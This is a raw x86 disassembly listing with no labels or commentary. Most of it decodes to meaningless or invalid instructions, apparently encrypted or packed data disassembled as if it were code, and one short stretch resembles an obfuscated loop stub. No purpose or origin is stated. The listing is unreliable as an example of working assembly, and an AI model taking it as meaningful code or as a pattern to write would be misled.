  40581b:	mov    eax,0x1c81eb71
  405820:	lods   eax,DWORD PTR ds:[esi]
  405821:	sar    DWORD PTR [ebp+0x5f],0x8c
  405825:	jns    0x405836
  405827:	sbb    ah,cl
  405829:	sbb    cl,BYTE PTR [edx]
  40582b:	xchg   BYTE PTR [ebp+0x13],dh
  40582e:	cli    
  40582f:	shl    DWORD PTR [ebx-0x60],1
  405832:	mov    esi,0x979921bc
  405837:	popa   
  405838:	mov    ah,0x72
  40583a:	out    dx,eax
  40583b:	out    0x1b,eax
  40583d:	sub    eax,0xd856c8df
  405842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405843:	aad    0x9f
  405845:	pop    esp
  405846:	xchg   ebp,eax
  405847:	xchg   BYTE PTR [edx],bh
  405849:	sub    BYTE PTR [edx-0x5e],cl
  40584c:	push   esp
  40584d:	mov    ah,0x98
  40584f:	fs and ebp,edi
  405852:	adc    DWORD PTR [eax],ebp
  405854:	and    al,0xfa
  405856:	dec    ebx
  405857:	ror    cl,0x89
  40585a:	xchg   esi,eax
  40585b:	in     al,0x1e
  40585d:	mov    dl,0x3b
  40585f:	scas   al,BYTE PTR es:[edi]
  405860:	leave  
  405861:	adc    BYTE PTR [esi+0x78f139f5],ch
  405867:	es out dx,al
  405869:	in     al,0xf4
  40586b:	(bad)  
  40586c:	into   
  40586d:	dec    eax
  40586e:	pop    ds
  40586f:	rcl    BYTE PTR [edx-0x52521d4e],0x3
  405876:	xor    al,0x1c
  405878:	xchg   ebx,eax
  405879:	sub    esp,DWORD PTR [edi-0x4834937]
  40587f:	test   DWORD PTR [esi+0x45875558],0x8993c8c7
  405889:	mov    ebp,0xa298625e
  40588e:	sbb    DWORD PTR [ebx-0x4fea7ad5],ebx
  405894:	inc    esi
  405895:	sbb    DWORD PTR ds:0x3697bfaa,esp
  40589b:	(bad)  
  40589c:	mov    al,ds:0x82913a5a
  4058a1:	and    BYTE PTR [ebx],dl
  4058a3:	fucom  st(7)
  4058a5:	pop    es
  4058a6:	clc    
  4058a7:	jl     0x4058bd
  4058a9:	inc    edi
  4058aa:	inc    edi
  4058ab:	mov    ss,WORD PTR [ebp+0x66]
  4058ae:	in     al,0xc0
  4058b0:	inc    esi
  4058b1:	push   0x4a65c970
  4058b6:	lock adc DWORD PTR ds:0xea8a0030,esp
  4058bd:	les    edx,FWORD PTR [edx]
  4058bf:	sub    DWORD PTR [edx-0x1efd46c3],ebx
  4058c5:	or     BYTE PTR [ebx],bh
  4058c7:	scas   eax,DWORD PTR es:[edi]
  4058c8:	adc    al,0x3d
  4058ca:	push   ebp
  4058cb:	jmp    0x40a8:0x9d0b5ec4
  4058d2:	repz ss out dx,al
  4058d5:	setl   BYTE PTR fs:[ebx-0x4a]
  4058da:	aas    
  4058db:	and    DWORD PTR [ecx],ebx
  4058dd:	or     cl,BYTE PTR [eax+0x5510c36]
  4058e3:	mov    BYTE PTR [esi-0x78],cl
  4058e6:	fild   QWORD PTR [edx-0x7d37cb31]
  4058ec:	sub    BYTE PTR [esi-0x2a],al
  4058ef:	(bad)  
  4058f0:	sbb    DWORD PTR [edi+0x4c],eax
  4058f3:	mov    ds:0xb937b59,al
  4058f8:	shl    BYTE PTR [ecx+eiz*2+0x10fbbd8],0x71
  405900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405901:	pop    esi
  405902:	xor    eax,0x213b7284
  405907:	sbb    edx,eax
  405909:	js     0x405974
  40590b:	push   ecx
  40590c:	ja     0x40588e
  40590e:	out    dx,al
  40590f:	adc    esi,DWORD PTR [ebx-0x602b114f]
  405915:	sub    DWORD PTR [eax-0x1f],edx
  405918:	shl    ebp,0xf0
  40591b:	stos   DWORD PTR es:[edi],eax
  40591c:	cwde   
  40591d:	jecxz  0x40597f
  40591f:	xor    edx,DWORD PTR [ebx]
  405921:	sbb    BYTE PTR [esi-0x14],ah
  405924:	jecxz  0x405913
  405926:	not    BYTE PTR [ecx-0x30fa409d]
  40592c:	and    eax,0x24b43740
  405931:	bound  ebx,QWORD PTR [eax+ebx*2-0x145c7e54]
  405938:	hlt    
  405939:	lea    eax,[eax-0x76774a11]
  40593f:	add    al,BYTE PTR [eax]
  405941:	sub    eax,0xb80533a6
  405946:	(bad)  
  405947:	leave  
  405948:	out    0x94,eax
  40594a:	xor    edi,edx
  40594c:	shr    DWORD PTR [edi],0x4b
  40594f:	and    edi,edi
  405951:	add    cl,ch
  405953:	push   ecx
  405954:	pop    ds
  405955:	inc    eax
  405956:	jp     0x405959
  405958:	aas    
  405959:	push   edx
  40595a:	xchg   edi,eax
  40595b:	pop    esi
  40595c:	jmp    0x8c0968d1
  405961:	cli    
  405962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405963:	xchg   ebx,eax
  405964:	mov    dl,0x66
  405966:	imul   esp,DWORD PTR [ecx+0x5e],0xdb607ff5
  40596d:	xor    dl,BYTE PTR [esi+0x3b]
  405970:	les    ebx,FWORD PTR [ebx+0x6d7e0e53]
  405976:	lods   eax,DWORD PTR ds:[esi]
  405977:	sar    DWORD PTR [ecx-0x47],cl
  40597a:	out    dx,eax
  40597b:	or     BYTE PTR [edi],0x2d
  40597e:	and    ebp,DWORD PTR [edx]
  405980:	repz xchg ebp,eax
  405982:	mov    cs,WORD PTR [edi]
  405984:	lock or eax,0xffb83018
  40598a:	jae    0x40595a
  40598c:	mov    cl,0x95
  40598e:	mov    al,ds:0xc37f975b
  405993:	outs   dx,BYTE PTR ds:[esi]
  405994:	sub    DWORD PTR [eax+0x26a1b678],edi
  40599a:	xchg   esp,eax
  40599b:	sbb    eax,0x7b7438a3
  4059a0:	cmp    DWORD PTR ds:0xbe6b3001,eax
  4059a6:	pop    DWORD PTR [esi-0x5ca2a27f]
  4059ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ad:	pop    es
  4059ae:	mov    ah,0x56
  4059b0:	fs mov edi,ss
  4059b3:	adc    eax,0x472961bb
  4059b8:	jo     0x4059f8
  4059ba:	xor    BYTE PTR [ecx-0x7a],dl
  4059bd:	sub    bh,cl
  4059bf:	(bad)  
  4059c0:	test   edx,0xcc06c8e4
  4059c6:	pop    edx
  4059c7:	iret   
  4059c8:	pushf  
  4059c9:	sub    ch,bl
  4059cb:	nop
  4059cc:	mov    al,ds:0x71df20c2
  4059d1:	fs mov edx,0x4f040703
  4059d7:	imul   ebx,edi,0xffffffa8
  4059da:	lds    edx,FWORD PTR [ecx]
  4059dc:	shl    BYTE PTR [ecx-0x7],0xfa
  4059e0:	adc    al,0xdd
  4059e2:	adc    DWORD PTR [edx-0x2f],ebp
  4059e5:	hlt    
  4059e6:	imul   ebp,DWORD PTR [esi+ecx*1+0x23],0x8c7c591c
  4059ee:	ror    DWORD PTR [edi-0x66],cl
  4059f1:	mov    ebp,0x94d7485c
  4059f6:	pop    esi
  4059f7:	sbb    eax,0x3430b4d6
  4059fc:	sbb    ah,BYTE PTR [ecx+0x511c28b2]
  405a02:	repz sar bh,cl
  405a05:	pop    edi
  405a06:	popa   
  405a07:	xchg   ebp,eax
  405a08:	mov    edi,DWORD PTR [esi]
  405a0a:	fadd   QWORD PTR ds:0x1e674
  405a10:	sbb    DWORD PTR [edi],ebp
  405a12:	ror    dl,0x7b
  405a15:	dec    eax
  405a16:	mov    esi,0xf8b10ce5
  405a1b:	dec    ecx
  405a1c:	imul   ecx,DWORD PTR [edx],0xffffffd5
  405a1f:	mov    al,0x7a
  405a21:	fs das 
  405a23:	js     0x4059f3
  405a25:	push   es
  405a26:	jp     0x405a0b
  405a28:	inc    ebx
  405a29:	outs   dx,DWORD PTR ds:[esi]
  405a2a:	xchg   ebp,eax
  405a2b:	test   al,0xfa
  405a2d:	mov    al,ds:0xae95abb2
  405a32:	sbb    al,0x18
  405a34:	lods   al,BYTE PTR ds:[esi]
  405a35:	test   eax,0x87424c29
  405a3a:	ss (bad) 
  405a3c:	mov    ebp,0x2b11bd46
  405a41:	ror    BYTE PTR [ebp-0x70fbc547],1
  405a47:	push   ecx
  405a48:	push   esi
  405a49:	jns    0x405a7e
  405a4b:	int    0xcd
  405a4d:	and    dl,bl
  405a4f:	jl     0x405aa9
  405a51:	mov    dh,0xa2
  405a53:	cdq    
  405a54:	inc    ebp
  405a55:	jo     0x405a49
  405a57:	mov    ds:0x842c1c8d,al
  405a5c:	imul   esi,DWORD PTR [edi-0x33],0xffffffc8
  405a60:	mov    ah,0x77
  405a62:	inc    ebp
  405a63:	movlps QWORD PTR [ebx-0x6a],xmm0
  405a67:	icebp  
  405a68:	mov    edi,0xf3d1eeea
  405a6d:	pushf  
  405a6e:	push   ebp
  405a6f:	and    eax,0x9c9fab87
  405a74:	mov    ebp,0x20c8eaf1
  405a79:	sub    BYTE PTR [ecx],0x90
  405a7c:	iret   
  405a7d:	adc    ch,BYTE PTR [edx+0x692b93f7]
  405a83:	cmp    esp,DWORD PTR [ecx-0x51]
  405a86:	xlat   BYTE PTR ds:[ebx]
  405a87:	mov    bl,0xd7
  405a89:	mov    esp,0x6988d610
  405a8e:	xor    ebp,DWORD PTR [edx-0x6ef3015a]
  405a94:	mov    esi,0x9c951025
  405a99:	jmp    0x405ae6
  405a9b:	pop    edx
  405a9c:	out    0x46,eax
  405a9e:	fst    DWORD PTR [edi+0x7c7257a7]
  405aa4:	lock sub esi,esp
  405aa7:	das    
  405aa8:	shr    edi,1
  405aaa:	push   cs
  405aab:	aas    
  405aac:	lods   al,BYTE PTR ds:[esi]
  405aad:	pop    ebx
  405aae:	stos   DWORD PTR es:[edi],eax
  405aaf:	fisttp WORD PTR [ecx]
  405ab1:	out    dx,al
  405ab2:	repz fs dec esp
  405ab5:	push   ecx
  405ab6:	les    eax,FWORD PTR [edi-0xc]
  405ab9:	lds    ebx,FWORD PTR [ecx-0x41e80434]
  405abf:	les    esi,FWORD PTR [bp+di]
  405ac2:	pop    es
  405ac3:	push   ds
  405ac4:	mul    DWORD PTR [ebx+0x2098bc8b]
  405aca:	xor    BYTE PTR [edx+0x35],0xe1
  405ace:	cwde   
  405acf:	fcom   st(2)
  405ad1:	int3   
  405ad2:	push   ds
  405ad3:	xchg   esp,eax
  405ad4:	xor    DWORD PTR [ebp-0xf759caf],edi
  405ada:	inc    ebx
  405adb:	pop    esp
  405adc:	push   cs
  405add:	loope  0x405a9b
  405adf:	jnp    0x405b0c
  405ae1:	scas   al,BYTE PTR es:[edi]
  405ae2:	cs jmp 0xd369:0x971a2bae
  405aea:	fst    st(1)
  405aec:	mov    WORD PTR [esi+0x5c],gs
  405aef:	in     eax,0x6
  405af1:	xor    al,bl
  405af3:	scas   al,BYTE PTR es:[edi]
  405af4:	mov    DWORD PTR [edi-0x5f],ebx
  405af7:	aad    0x12
  405af9:	cmp    bl,ch
  405afb:	out    dx,al
  405afc:	das    
  405afd:	pop    es
  405afe:	fld    TBYTE PTR [ebp+0x358e03c6]
  405b04:	push   esi
  405b05:	jmp    0xc41d:0x38b46ec7
  405b0c:	rol    bh,0xa3
  405b0f:	sub    ebx,DWORD PTR [ebp-0x6019dd49]
  405b15:	dec    ebx
  405b16:	and    dl,dh
  405b18:	sub    BYTE PTR [edi+eax*8+0x33],bl
  405b1c:	pop    edx
  405b1d:	xor    edx,edx
  405b1f:	mov    ecx,0xd01e0be4
  405b24:	cmp    dh,BYTE PTR [edx-0x389fce95]
  405b2a:	adc    eax,0x19be8499
  405b2f:	fld    TBYTE PTR [esi]
  405b31:	mov    al,ds:0xc1bce68e
  405b36:	jg     0x405ac3
  405b38:	dec    ebp
  405b39:	lock sub DWORD PTR ds:0x42a266,0x42a2e2
  405b44:	xor    eax,esi
  405b46:	add    DWORD PTR ds:0x42a2ea,0x138
  405b50:	xor    ecx,esi
  405b52:	lea    ecx,[eax+ecx*1+0x64e5e2]
  405b59:	and    DWORD PTR ds:0x42a26a,0x0
  405b63:	xor    eax,eax
  405b65:	or     eax,DWORD PTR ds:0x42a26a
  405b6b:	inc    eax
  405b6c:	mov    ds:0x42a26a,eax
  405b71:	cmp    DWORD PTR ds:0x42a26a,0x7
  405b78:	jge    0x405bae
  405b7e:	jmp    0x405b89
  405b83:	call   DWORD PTR ds:0x42a3da
  405b89:	cmp    DWORD PTR ds:0x42a26a,0x6
  405b90:	jne    0x405ba1
  405b96:	mov    eax,ds:0x42a26a
  405b9b:	inc    eax
  405b9c:	mov    ds:0x42a26a,eax
  405ba1:	cmp    DWORD PTR ds:0x42a26a,0x11
  405ba8:	jb     0x405b63
  405bae:	mov    eax,DWORD PTR [ebp-0xc]
  405bb1:	sbb    DWORD PTR ds:0x42a2c6,0x42a2f6
  405bbb:	xor    edx,edx
  405bbd:	or     DWORD PTR ds:0x42a29e,0x16dc
  405bc7:	div    ecx
  405bc9:	or     eax,ecx
  405bcb:	mov    eax,DWORD PTR [ebp-0x8]
  405bce:	xor    ecx,ecx
  405bd0:	xor    ecx,DWORD PTR ds:0x42a292
  405bd6:	sbb    DWORD PTR ds:0x42a2fa,ecx
  405bdc:	mov    ecx,DWORD PTR [ebp-0x10]
  405bdf:	xor    eax,esi
  405be1:	or     DWORD PTR ds:0x42a2c2,0x42a29a
  405beb:	xor    ecx,esi
  405bed:	sbb    DWORD PTR ds:0x42a2be,0x52cd
  405bf7:	sub    eax,ecx
  405bf9:	cmp    edx,eax
  405bfb:	jmp    0x407f54
  405c00:	mov    esp,0x8265841a
  405c05:	loope  0x405ba5
  405c07:	add    BYTE PTR [eax+0x74],0x97
  405c0b:	es push es
  405c0d:	push   esp
  405c0e:	aad    0x6c
  405c10:	or     edi,DWORD PTR [ecx]
  405c12:	add    DWORD PTR [ebx-0x7c7ca1b9],0x1e
  405c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c1a:	frstor [ebx]
  405c1c:	jo     0x405c91
  405c1e:	inc    ebp
  405c1f:	push   cs
  405c20:	push   edi
  405c21:	cli    
  405c22:	pop    es
  405c23:	pop    ecx
  405c24:	add    BYTE PTR [esi+edi*8+0x14be089d],ch
  405c2b:	fstp   TBYTE PTR [ecx+0x39]
  405c2e:	jl     0x405bb8
  405c30:	dec    ebx
  405c31:	xchg   ecx,esi
  405c33:	add    DWORD PTR [ebp-0x8],ecx
  405c36:	ror    DWORD PTR [edi+0x204a289],1
  405c3c:	jp     0x405c43
  405c3e:	js     0x405c80
  405c40:	xor    BYTE PTR [ecx-0x14],bl
  405c43:	in     al,0x31
  405c45:	or     DWORD PTR [edx-0x45],ebp
  405c48:	fisttp QWORD PTR [ebp+0x49b6a2fb]
  405c4e:	xchg   esp,eax
  405c4f:	fdivr  st(1),st
  405c51:	repnz arpl WORD PTR [ebx-0x1ed91074],bp
  405c58:	dec    ecx
  405c59:	or     esp,DWORD PTR [edx-0x36]
  405c5c:	(bad)  
  405c5d:	pop    ecx
  405c5e:	test   edx,eax
  405c60:	(bad)  
  405c61:	leave  
  405c62:	cmp    eax,0x1c6bc3c4
  405c67:	lock mov ds:0xe8dd728a,al
  405c6d:	lods   al,BYTE PTR ds:[esi]
  405c6e:	push   edx
  405c6f:	loop   0x405c6e
  405c71:	jae    0x405c4c
  405c73:	push   es
  405c74:	(bad)  
  405c75:	rcl    BYTE PTR ds:0x202b0ab1,1
  405c7b:	fs push edi
  405c7d:	push   ds
  405c7e:	scas   eax,DWORD PTR es:[edi]
  405c7f:	or     edx,ebx
  405c81:	inc    esi
  405c82:	jge    0x405c78
  405c84:	clc    
  405c85:	adc    al,0x2b
  405c87:	or     ah,ah
  405c89:	cdq    
  405c8a:	aad    0x62
  405c8c:	sub    al,0x76
  405c8e:	or     bl,cl
  405c90:	jl     0x405ca6
  405c92:	mov    ds:0x27fa7cb1,al
  405c97:	jns    0x405cbb
  405c99:	int    0xd3
  405c9b:	loopne 0x405cbb
  405c9d:	loope  0x405ca9
  405c9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ca0:	inc    ebx
  405ca1:	sub    esp,edi
  405ca3:	fst    QWORD PTR ds:0x2322ad3
  405ca9:	leave  
  405caa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cab:	mov    esi,0x2ca88662
  405cb0:	loope  0x405c9b
  405cb2:	xchg   ebx,eax
  405cb3:	adc    edi,DWORD PTR [esi+ebx*1-0x55]
  405cb7:	in     eax,0x6c
  405cb9:	mov    dh,0x9c
  405cbb:	fiadd  WORD PTR [esi-0x29]
  405cbe:	pop    ebx
  405cbf:	jb     0x405cd9
  405cc1:	les    ebp,FWORD PTR [ecx+eax*8-0x7d5eb559]
  405cc8:	sbb    BYTE PTR [ebp-0x3f74032c],ch
  405cce:	inc    esp
  405ccf:	mov    ch,0x81
  405cd1:	xor    BYTE PTR [ebx],dh
  405cd3:	fisttp WORD PTR [ebx]
  405cd5:	pop    ecx
  405cd6:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cd8:	sub    dh,0xbf
  405cdb:	cmp    ah,al
  405cdd:	xchg   ebp,eax
  405cde:	mov    ah,0xa1
  405ce0:	cdq    
  405ce1:	push   ebp
  405ce2:	jmp    0x69f6:0x1b45ab35
  405ce9:	mov    ds,eax
  405ceb:	inc    ebx
  405cec:	mov    ebx,0xe88f5c9f
  405cf1:	and    eax,0xb501aa6d
  405cf6:	jl     0x405d19
  405cf8:	bound  edx,QWORD PTR [edx]
  405cfa:	loope  0x405d17
  405cfc:	mov    eax,0xdee351bf
  405d01:	sti    
  405d02:	sbb    al,0x3c
  405d04:	enter  0x7f48,0xd
  405d08:	jb     0x405d10
  405d0a:	je     0x405d64
  405d0c:	sub    bh,cl
  405d0e:	mov    eax,ds:0xe75df852
  405d13:	mov    edi,0x94be7bfa
  405d18:	xor    DWORD PTR [ebx+0x4],ebx
  405d1b:	xchg   esp,eax
  405d1c:	or     bl,bh
  405d1e:	test   DWORD PTR [esi-0x347bc257],0x1fa189ca
  405d28:	call   0xc2cf:0xc0b429bf
  405d2f:	popa   
  405d30:	icebp  
  405d31:	and    ebx,DWORD PTR [ecx+0x28840c90]
  405d37:	and    DWORD PTR [esi+0x66],0xb533bcf8
  405d3e:	cmp    eax,0xe94e7254
  405d43:	adc    ah,dh
  405d45:	jmp    0x405d0f
  405d47:	fstp   QWORD PTR [ebx+ecx*4+0x24]
  405d4b:	loop   0x405dac
  405d4d:	jae    0x405cd1
  405d4f:	ror    BYTE PTR [ebp-0x599659],cl
  405d55:	jo     0x405d45
  405d57:	xlat   BYTE PTR ds:[ebx]
  405d58:	test   DWORD PTR [edi],edx
  405d5a:	fild   DWORD PTR [edx+0x35c8a4a5]
  405d60:	xor    al,ah
  405d62:	cli    
  405d63:	mov    ebp,DWORD PTR [edi+0x1d86c85c]
  405d69:	mov    BYTE PTR [ebx-0xc9c304e],0x73
  405d70:	xor    edi,edx
  405d72:	xchg   edi,eax
  405d73:	retf   
  405d74:	popf   
  405d75:	cli    
  405d76:	dec    esi
  405d77:	dec    esp
  405d78:	and    DWORD PTR [ebp+0x63c09b42],esi
  405d7e:	aaa    
  405d7f:	xor    ebx,edx
  405d81:	jl     0x405da3
  405d83:	fidivr DWORD PTR [esi-0x1b8a05bf]
  405d89:	test   DWORD PTR [esp+eax*1-0x4d],edx
  405d8d:	(bad)  
  405d8e:	adc    dl,BYTE PTR [ecx-0x60]
  405d91:	mov    cl,0x2d
  405d93:	xor    eax,0x3e505ead
  405d98:	popf   
  405d99:	cmc    
  405d9a:	add    edx,DWORD PTR [edi+0x6a0fe056]
  405da0:	cmp    eax,0xc773bca1
  405da5:	jae    0x405dbf
  405da7:	or     al,0x8d
  405da9:	sub    ebp,ebx
  405dab:	mov    ah,0xfe
  405dad:	sbb    esi,ecx
  405daf:	(bad)  
  405db0:	jns    0x405df0
  405db2:	mov    ebx,DWORD PTR [ebx+edi*8]
  405db5:	jno    0x405d70
  405db7:	dec    esp
  405db8:	popf   
  405db9:	sbb    esi,DWORD PTR [edi-0x1d6ee336]
  405dbf:	or     edi,DWORD PTR [ecx]
  405dc1:	mov    ecx,0x742e51e6
  405dc6:	mov    edx,0x2c45336d
  405dcb:	imul   ebp,edi,0xce9eeecf
  405dd1:	imul   eax,ebx,0xffffffc2
  405dd4:	xchg   edx,eax
  405dd5:	mov    dh,0x16
  405dd7:	pop    ds
  405dd8:	je     0x405e31
  405dda:	cmp    BYTE PTR [ecx+0x9],bl
  405ddd:	jbe    0x405e19
  405ddf:	cld    
  405de0:	push   cs
  405de1:	adc    eax,0xfffffff2
  405de4:	pop    ss
  405de5:	or     dh,BYTE PTR [eax-0x29]
  405de8:	adc    al,0xea
  405dea:	push   esi
  405deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dec:	fmul   st,st(5)
  405dee:	addr16 enter 0xa7da,0xe0
  405df3:	das    
  405df4:	shr    cl,cl
  405df6:	inc    edi
  405df7:	cmp    BYTE PTR ds:0xfa5bd63f,cl
  405dfd:	adc    ebx,DWORD PTR [eax]
  405dff:	es sbb cl,0x35
  405e03:	lock xchg DWORD PTR [ecx+edx*8+0x67],ebp
  405e08:	xchg   ebx,eax
  405e09:	stc    
  405e0a:	scas   eax,DWORD PTR es:[edi]
  405e0b:	std    
  405e0c:	repz xchg ecx,eax
  405e0e:	and    BYTE PTR [edi+0x50bca2b1],ah
  405e14:	leave  
  405e15:	cmp    al,dh
  405e17:	xor    BYTE PTR [ebp-0x1bb0fe94],bl
  405e1d:	push   esp
  405e1e:	popa   
  405e1f:	jecxz  0x405dbc
  405e21:	push   ss
  405e22:	imul   ebx,eax,0x880db438
  405e28:	pop    eax
  405e29:	hlt    
  405e2a:	ret    0x7dd9
  405e2d:	inc    ecx
  405e2e:	sub    BYTE PTR [ebx],0x64
  405e31:	mov    bh,0x2d
  405e33:	shr    DWORD PTR [edx-0x2f1c8e36],1
  405e39:	call   0x77ef:0x27384ff9
  405e40:	int    0x53
  405e42:	add    esp,esp
  405e44:	hlt    
  405e45:	cli    
  405e46:	xchg   ebx,eax
  405e47:	sbb    al,0x4f
  405e49:	dec    ebx
  405e4a:	mov    ch,0x0
  405e4c:	sub    DWORD PTR [ebx-0x35],0x1b544c07
  405e53:	jmp    0x405e00
  405e55:	out    0xd8,eax
  405e57:	mov    eax,0x55cacd99
  405e5c:	cmp    BYTE PTR [esi+0x2ff1d347],0x74
  405e63:	fs or  al,0x8c
  405e66:	push   ds
  405e67:	retf   0x3eac
  405e6a:	add    al,dl
  405e6c:	pop    ecx
  405e6d:	addr16 push 0xe9f0f70d
  405e73:	and    edi,eax
  405e75:	imul   ebp,DWORD PTR ds:0x9dd0ad1c,0x77
  405e7c:	pop    ds
  405e7d:	mov    cl,0xea
  405e7f:	and    bl,ah
  405e81:	addr16 das 
  405e83:	loope  0x405e82
  405e85:	add    DWORD PTR [eax+0x66],esi
  405e88:	fmul   DWORD PTR [esi]
  405e8a:	ins    BYTE PTR es:[edi],dx
  405e8b:	cmp    dl,BYTE PTR [eax+0x7e]
  405e8e:	repnz cs mov cl,0x57
  405e92:	dec    ecx
  405e93:	out    dx,al
  405e94:	mov    bh,bl
  405e96:	(bad)  
  405e97:	cmp    BYTE PTR [ebp+0x44],bh
  405e9a:	pushw  ss
  405e9c:	lods   al,BYTE PTR ds:[esi]
  405e9d:	or     al,0x73
  405e9f:	xlat   BYTE PTR ds:[ebx]
  405ea0:	inc    ebp
  405ea1:	pop    edi
  405ea2:	inc    ebp
  405ea3:	add    eax,0xeae218a9
  405ea8:	xchg   ebp,eax
  405ea9:	ss (bad) 
  405eab:	sbb    DWORD PTR [edi+0xe],ecx
  405eae:	add    eax,0xdab8c3b7
  405eb3:	popa   
  405eb4:	push   esp
  405eb5:	fsubr  st(3),st
  405eb7:	rol    BYTE PTR [ebx+0x16],cl
  405eba:	int3   
  405ebb:	sub    bl,BYTE PTR [edi-0x5a8f805d]
  405ec1:	arpl   WORD PTR [edx+ebp*2-0x54],bp
  405ec5:	call   0x1473:0xae9c830f
  405ecc:	sub    BYTE PTR [ebx],dl
  405ece:	mov    ds:0x540ea58d,al
  405ed3:	arpl   WORD PTR [ebp-0x3b814efb],bp
  405ed9:	inc    esi
  405eda:	iret   
  405edb:	and    eax,0xa8a68fd5
  405ee0:	mov    esp,0x8377f33c
  405ee5:	sahf   
  405ee6:	xchg   ebp,edx
  405ee8:	inc    ecx
  405ee9:	call   0x3deadca
  405eee:	add    DWORD PTR [ecx-0x806f84e],0xa92a23bc
  405ef8:	scas   eax,DWORD PTR es:[edi]
  405ef9:	mov    ?,WORD PTR [esi+0xe]
  405efc:	bound  eax,QWORD PTR [edi+0x77]
  405eff:	mov    esi,0xf5cc186b
  405f04:	out    0xf0,al
  405f06:	xor    eax,0xa808ea45
  405f0c:	out    dx,al
  405f0d:	lea    ecx,[ebp+0x2d]
  405f10:	inc    ecx
  405f11:	(bad)  
  405f12:	xchg   esp,eax
  405f13:	rol    ebx,cl
  405f15:	cld    
  405f16:	cmp    DWORD PTR [edi-0x2a],esp
  405f19:	push   ss
  405f1a:	outs   dx,DWORD PTR ds:[esi]
  405f1b:	sub    ebx,ecx
  405f1d:	add    dh,BYTE PTR [edi-0x23]
  405f20:	or     eax,0x6b8ffc6b
  405f25:	call   0x6bbeced6
  405f2a:	icebp  
  405f2b:	loope  0x405f65
  405f2d:	inc    ebx
  405f2e:	or     BYTE PTR [esp+eax*8+0x72],al
  405f32:	xor    al,BYTE PTR [edi]
  405f34:	add    esp,esp
  405f36:	cmp    BYTE PTR [eax+0x10],ch
  405f39:	mov    esi,0xac115337
  405f3e:	pusha  
  405f3f:	fistp  DWORD PTR [ebp+edx*1+0x37684a4]
  405f46:	jg     0x405f72
  405f48:	or     al,0x58
  405f4a:	sbb    dl,BYTE PTR [ebx+0x39]
  405f4d:	sub    BYTE PTR [ebx],ah
  405f4f:	ud1    edx,DWORD PTR [eax+0x71308b5]
  405f56:	ins    BYTE PTR es:[edi],dx
  405f57:	jno    0x405f59
  405f59:	shl    BYTE PTR ds:0xea192880,cl
  405f5f:	addr16 sahf 
  405f61:	pop    esi
  405f62:	mov    dl,0x1a
  405f64:	test   BYTE PTR [ebx],ch
  405f66:	aad    0xf9
  405f68:	(bad)  
  405f69:	jmp    0x9280af42
  405f6e:	mov    dh,0x9b
  405f70:	add    eax,0xdb7969d3
  405f75:	adc    bl,BYTE PTR [edx]
  405f77:	addr16 popa 
  405f79:	mov    edi,0xd113b23c
  405f7e:	es retf 
  405f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f81:	outs   dx,DWORD PTR ds:[esi]
  405f82:	sar    edi,1
  405f84:	xchg   BYTE PTR [edx+0x72],ch
  405f87:	xchg   ecx,eax
  405f88:	push   ecx
  405f89:	dec    ebx
  405f8a:	cmp    DWORD PTR [eax],ecx
  405f8c:	leave  
  405f8d:	rcl    ebp,1
  405f8f:	xor    cl,BYTE PTR [eax]
  405f91:	or     BYTE PTR [ecx+esi*1+0x1d],bh
  405f95:	icebp  
  405f96:	push   0x1
  405f98:	out    0x2,eax
  405f9a:	(bad)  [eax]
  405f9c:	ins    DWORD PTR es:[edi],dx
  405f9d:	fst    QWORD PTR [ecx]
  405f9f:	cld    
  405fa0:	aad    0xe5
  405fa2:	aad    0x97
  405fa4:	inc    ebp
  405fa5:	dec    edx
  405fa6:	cld    
  405fa7:	sub    BYTE PTR [edx+eax*8+0x3],dh
  405fab:	sbb    BYTE PTR [ecx+0x2c],al
  405fae:	shr    BYTE PTR [ebp+ecx*8+0x4e1ba0f],0xcf
  405fb6:	cmp    cl,BYTE PTR [ecx]
  405fb8:	in     al,0x71
  405fba:	mov    ebp,0xe95873b5
  405fbf:	adc    ecx,esp
  405fc1:	adc    BYTE PTR [ecx-0x6a],bl
  405fc4:	jp     0x405f8a
  405fc6:	and    ch,BYTE PTR [ecx-0x23]
  405fc9:	int    0x5e
  405fcb:	in     eax,dx
  405fcc:	aad    0x52
  405fce:	(bad)  
  405fcf:	jp     0x405f6d
  405fd1:	dec    esi
  405fd2:	fild   DWORD PTR [edi+0x46b307bb]
  405fd8:	xchg   ebx,eax
  405fd9:	ds jmp 0x406045
  405fdc:	stos   DWORD PTR es:[edi],eax
  405fdd:	and    DWORD PTR [eax],ebp
  405fdf:	add    ch,BYTE PTR [ecx+0x63]
  405fe2:	mov    ebx,0x47edff4f
  405fe7:	lods   al,BYTE PTR ds:[esi]
  405fe8:	mov    WORD PTR [ebx+0x5b655c53],ds
  405fee:	dec    eax
  405fef:	mov    ecx,ebp
  405ff1:	push   esi
  405ff2:	jb     0x40602e
  405ff4:	mov    ?,WORD PTR [edx-0x7]
  405ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ff8:	in     eax,dx
  405ff9:	dec    ebx
  405ffa:	in     eax,0x2d
  405ffc:	imul   edx,DWORD PTR [edi+0x5f],0x69c98c6f
  406003:	inc    ecx
  406004:	jecxz  0x406054
  406006:	mov    ch,0x4b
  406008:	ret    0x1894
  40600b:	repz sahf 
  40600d:	(bad)  
  40600e:	fisubr DWORD PTR [ebx+0x61b254f8]
  406014:	ss jbe 0x406055
  406017:	(bad)  
  406018:	lahf   
  406019:	inc    eax
  40601a:	int3   
  40601b:	stc    
  40601c:	adc    dh,BYTE PTR [esi]
  40601e:	jbe    0x405fbc
  406020:	add    esi,DWORD PTR [ebx-0x1e]
  406023:	ds dec ecx
  406025:	lea    ebx,[esi-0x4b5afabf]
  40602b:	lods   al,BYTE PTR ds:[esi]
  40602c:	or     eax,0x7c71a493
  406031:	retf   
  406032:	fs adc al,0x28
  406035:	aaa    
  406036:	jl     0x40600e
  406038:	(bad)  [edx]
  40603a:	stc    
  40603b:	jp     0x406028
  40603d:	setge  ch
  406040:	outs   dx,BYTE PTR ds:[esi]
